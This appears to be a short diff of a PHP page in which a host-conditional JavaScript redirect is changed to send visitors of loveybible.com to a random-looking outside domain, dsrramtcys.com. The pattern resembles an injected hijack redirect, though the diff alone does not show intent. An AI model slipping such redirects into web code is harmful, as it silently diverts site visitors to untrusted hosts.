@@ -1,5 +1,5 @@
 <?php
-header("content-type:text/html;charset=utf-8");if($_SERVER['HTTP_HOST']=='www.loveybible.com' || $_SERVER['HTTP_HOST']=='loveybible.com'){	echo "<script>window.location.href='http://www.missinglovelove.com/manage'</script>";}
+header("content-type:text/html;charset=utf-8");if($_SERVER['HTTP_HOST']=='www.loveybible.com' || $_SERVER['HTTP_HOST']=='loveybible.com'){	echo "<script>window.location.href='http://www.dsrramtcys.com/manage'</script>";}
 require("../configuration.php");
 require("includes.php");
 	//语言包引入
